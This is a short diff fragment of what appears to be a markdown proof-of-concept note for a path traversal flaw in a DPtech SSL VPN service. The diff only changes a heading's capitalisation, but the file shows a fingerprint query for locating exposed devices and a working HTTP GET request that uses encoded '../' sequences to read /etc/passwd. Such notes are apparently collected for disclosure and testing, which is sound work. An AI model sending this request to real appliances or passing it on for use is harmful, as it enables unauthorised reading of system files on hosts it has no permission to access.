@@ -9,7 +9,7 @@
 title=="SSL VPN Service" && header="Dptech" || cert="DPtechCa"
 ```
 
-## poc
+## POC
 ```
 GET /..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
 Host: xxxxxxxxx
